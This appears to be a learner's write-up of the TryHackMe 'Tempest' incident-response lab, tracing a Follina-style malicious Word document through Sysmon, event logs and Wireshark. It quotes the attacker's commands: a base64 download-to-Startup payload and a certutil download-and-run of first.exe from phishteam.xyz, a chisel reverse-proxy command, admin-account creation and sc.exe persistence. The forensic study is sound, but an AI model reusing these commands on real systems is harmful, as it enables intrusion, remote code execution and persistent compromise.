---
title: Tempest Lab
date: 2026-01-24 04:35:00
categories: [TryHackMe, Lab]
tags: [Log Analysis, Windows]
---

# Tempest

## Introduction
This room aims to introduce the process of analysing endpoint and network logs from a compromised asset. Given the artefacts, we will aim to uncover the incident from the Tempest machine. In this scenario, I was tasked to be one of the Incident Responders that will focus on handling and analysing the captured artefacts of a compromised machine.

This document will contain my process and solutions for the lab.

### Scenario
I am tasked as acting as a SOC analyst investigating a critical level exploit that requires further investigation. The intrusion appears to have started from from a malicous document.

The essential analysts prior composed the follwing pieces of essential information:
* The malicious document has a .doc extension.
* The user downloaded the malicious document via chrome.exe.
* The malicious document then executed a chain of commands to attain code execution.

## Preparation - Log Analysis
For analysing enpoint logs such as those from Windows and Sysmon the following tools are used:
* EvtxEcmd
* Timeline Explorer
* SysmonView
* Event Viewer

For packet capture data the following tools are used:
* Wireshark
* Brim

While tools like Sysmon and Wireshark were familiar to me many of the tools in this lab were new such is the EZTools (Eric Zimmeramn's Tools) including EvtxEcmd and Timeline Explorer. 

## Preparation - Tools and Artifacts

Obtaining the hashes for the different files is simple procedure with the function **Get-FileHash** in powershell all the hashes can be obtained at once using the following command:

``` Powershell
PS C:\Users\user\Desktop\Incident Files> Get-FileHash -Algorthim SHA256 *
```

### Results:
**capture.pcapng:** CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6 \
**sysmon.evtx:** 665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F \
**windows.evtx:** D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60


## Initial Access - Malicous Document

Using sysmon the logs can be filtered to search for sysom event 11 (File Creation). Looking at this shows a file being downloaded from chrome.exe.

**Name of malicious document:** free_magicules.doc

Searching the same log under the 'User Name' column shows this.

**Name of compromised user and machine:** benimaru-TEMPEST

Now that we have identified the malicious document we can determine what process opened it by looking logs under eventID 1 (Process Creation). Furthermore we can also filter for winword in the executable info as that is where .doc files are opened from.

**PID of Word process that opened the malicious document:** 496

To determine the malicous domain fo the process we can filter by Event ID 22 (DNS Query) and the PID of 496.

**IPv4 address resolved by the malicous domain:** 167.71.199.191

To determine the payload that is executed by the document we then simply need to filter by PID along with the event id for process creation (4688). The decrypted version of the payload reveals an obfuscated command exploting mdst.exe.

**base64 encoded string in the malicious payload executed by the document:** JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==

Researching vulnerabilies of this type shows one suitable found in 2022. 

**CVE number of the exploit used by the attacker to achieve remote code execution:** 2022-30190

## Initial Access - Stage 2 Execution

The decoded command from the previous section shows the location that the file was written to. 

**Full target path of the payload:** C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

We now know that the payload will become active on startup since the payload is found in the starting program folder directory. In the investigation guide provided it states that the autostart execution reflects explorer.exe as the parent process. Using this I can filter sysmon for parent process to explorer.exe, user to benimaru and EventID 1 (process creation) to find the command. In the 'Executable Info' column the command executed is present. 

**Executed command used upon successful login by the compromised user:** C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe

Going to the first.exe process the hash for the binary can be found in the logs.

**SHA256 hash of the malicious binary downloaded for stage 2 execution:** CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8

Now that the stage 2 has been downloaded an executed I can look for where it is connecting to. First by setting the parent process to first.exe in the logs I can see that an outbound connection is made using ch.exe and the port 80. To find the domain the logs can be searched through with the dns query filter to obtain the following answer. 

**Domain and port used for c2 server connection:** resolvecyber.xyz:80

## Initial Access - Malicious Document Traffic

With this information I have now discovered that the attacker fetched the stage 2 payload remotely and can now move on to finding network-related artefacts. The first artifact I can look for is the url embedded in the document that they opened. To do this I used wireshark with the following command:

``` Wireshark
http.request.method == "GET" and http.host == phishteam.xyz
```

**URL of malicious payload embedded in document:** http://phishteam.xyz/02dcf07/index.html

``` Wireshark
http.host == "resolvecyber.xyz"
```

Observing the q parameter in the pcap file shows HTTP GET request truncated data. This can be decoded in CyberChef to determine that it is base64.

```
GET /9ab62b5?q=d2hvYW1pIC0gdGVtcGCzdFxiZX5pbWFydQ0K
```

**The encoding used in the c2 connection by the attacker:** base64

**Parameter used by the binary containing executed command results:** q

**URL used by the binary:** /9ab62b5

**HTTP method used by the binary:** GET

Look at the user-agent of the packet shows that it is using Nim

**Programming language used ot compile the binary:** nim

## Discovery - Internal Reconnaissance

```
frame contains "?q="
```

This filter allows for searches containing commands. Decoding these different commands eventually one can be found with the $pass variable for an automation script. 

**Password for sensitive file:** infernotempest

Decoding more the base64 commands shows netstat output in which the port 5985 is access whihc is used for the WinRM service for HTTP.

**Listening port for the remote shell:** 5985

The same log that found the ch.exe executable also contains the information for the command.

**Command used to establish reverse proxy connection:** C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks

The same log shows the hash of the binary as well.

**SHA256 hash of the binary used by the attacker to establish the reverse socks proxy connection:** 8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451

Placing the hash in VirusTotal reveals the name of the tool used.

**name of the tool used by the attacker based on the SHA256 hash:** chisel


We saw above the port used to connect to winrm for HTTP posts making it likely used for the authentication. 

**Service used by the attacker to authenticate:** winrm

## Privelege Escalation - Exploiting Privileges

When setting up the proxy above the user downloaded another binary for escalating the priveleges.

**SHA256 hash of the binary:** spf.exe,8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D

Putting this have into VirsusTotal reveals that it is printspoofter, a tool used to escalated priveleges by exploiting impersonation priveleges.

**Name of the tool used:** printspoofer

**Privilege exploited:** SeImpersonatePrivilege

After downlading spf.exe the attacker then downloads final.exe formt the initial callback domain to execute through spf.exe.

**Binary used to establish c2 connection:** final.exe

```
ip.dst == 167.71.222.162
```

Using the ip address found earlier in the lab we can find TCP protocol log showing the usage of port 8080 which is an alternative port for HTTP traffic

**Port used:** 8080

## Actions on Objective - Fully Owned Machine 

At this point we know that the attack has gain administrative priveleges within the machine through the use of the tools they downloaded onto the machine. 

Filtering in Sysmon looking for process creation we can find in the system directory 2 new users are created in the local group of administrators. 

**Names of created user accounts:** shion,shuna

**Missing option that made attempt fail:** /add

**Event ID that indicates the account creation activity:** 4720

Looking at the Executable info column shows this:

**Command used to add user to local administer group:** net localgroup administrators /add shion

**Event ID that indicates the addition to a sensitive local group:** 4732


Finally looking at the payload data it can be seen that that final.exe is set to be a autostart program creating TemestUpdate2

**Command executed by the attacker to achieve persistent administrative access:** C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto